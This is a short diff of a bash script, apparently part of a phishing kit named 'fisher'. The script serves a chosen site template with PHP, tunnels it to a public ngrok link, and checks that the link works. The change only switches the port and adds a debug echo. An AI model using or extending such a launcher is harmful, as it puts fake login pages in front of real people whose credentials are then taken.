@@ -766,14 +766,15 @@ fi
 
 
 echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Host Server..."
-cd $HOME/fisher/webs/$site && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
+cd $HOME/fisher/webs/$site && php -S 127.0.0.1:2222 > /dev/null 2>&1 &
 sleep 8
 echo -e "\e[1;92m[\e[34m•\e[1;92m] Starting Ngrok Server..."
-./ngrok http 5555 > /dev/null 2>&1 &
+./ngrok http 2222 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
 status=$(curl -s -o /dev/null -I -w "%{http_code}" $link)
 stat=$(echo "$status")
+echo 'hiii'
 if [ "$stat" = "200" ];
 then
 echo -e  "\e[1;92m[\e[34m•\e[1;92m] Link working code \e[34m[\e[0m200\e[34m]\e[0m"
